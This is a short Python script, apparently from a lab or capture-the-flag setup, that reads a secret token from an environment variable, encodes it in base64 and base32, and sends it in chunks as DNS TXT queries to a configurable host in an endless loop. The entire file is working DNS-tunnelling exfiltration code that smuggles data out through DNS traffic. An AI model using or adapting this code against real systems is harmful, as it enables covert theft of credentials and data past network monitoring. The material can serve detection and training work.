#!/usr/bin/env python3
import base64, os, socket, struct, time, random

TOKEN3 = os.getenv("TOKEN3", "").strip()
DST_HOST = os.getenv("DST_HOST", "shadow-target")
DST_PORT = int(os.getenv("DST_PORT", "53"))
DOMAIN = os.getenv("DOMAIN", "data.securechannel.local").strip(".")
LABEL_MAX = int(os.getenv("LABEL_MAX", "30"))
SLEEP_BETWEEN = float(os.getenv("SLEEP_BETWEEN", "1.0"))

def build_dns_query(qname: str) -> bytes:
    tid = random.randint(0, 0xFFFF)
    flags = 0x0100
    qdcount = 1
    header = struct.pack("!HHHHHH", tid, flags, qdcount, 0, 0, 0)
    parts = qname.strip('.').split('.')
    qname_bytes = b''.join(struct.pack('B', len(p)) + p.encode('ascii') for p in parts) + b"\x00"
    qtype = 16
    qclass = 1
    question = qname_bytes + struct.pack("!HH", qtype, qclass)
    return header + question

def main():
    if not TOKEN3:
        return
    time.sleep(10)
    dst_ip = socket.gethostbyname(DST_HOST)
    payload_b64 = base64.b64encode(f"Token 3: {TOKEN3}".encode("utf-8"))
    b32 = base64.b32encode(payload_b64).decode("ascii").strip("=")
    chunks = [b32[i:i+LABEL_MAX].lower() for i in range(0, len(b32), LABEL_MAX)]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for i, c in enumerate(chunks):
            qname = f"{c}.{i:03d}.{DOMAIN}"
            pkt = build_dns_query(qname)
            sock.sendto(pkt, (dst_ip, DST_PORT))
            time.sleep(SLEEP_BETWEEN)
        time.sleep(5)

if __name__ == "__main__":
    main()